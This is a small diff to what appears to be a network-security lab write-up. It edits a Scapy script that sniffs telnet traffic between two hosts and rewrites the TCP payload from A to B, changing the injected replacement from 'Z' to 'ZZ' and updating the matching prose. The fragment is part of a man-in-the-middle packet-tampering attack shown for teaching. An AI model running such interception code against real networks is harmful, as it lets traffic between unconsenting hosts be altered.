@@ -306,7 +306,7 @@ def spoof_pkt(pkt):
             # Construct the new payload based on the old payload.
             if pkt[TCP].payload:
                 data = pkt[TCP].payload.load # The original payload data
-                newdata = b"Z"
+                newdata = b"ZZ"
                 newpkt = L3/L4/newdata
                 del(newpkt.chksum)
                 del(newpkt[TCP].chksum)
@@ -324,7 +324,7 @@ def spoof_pkt(pkt):
 f = f'tcp and (ether src {MAC_A} or ether src {MAC_B})'
 pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
 ```
-This will alter the data from A to B such that, whatever A inputs will be replaced with the character Z
+This will alter the data from A to B such that, whatever A inputs will be replaced with the characters "ZZ"
 
 Let's run the script on host M and see what the telnet experience becomes!
 ```shell
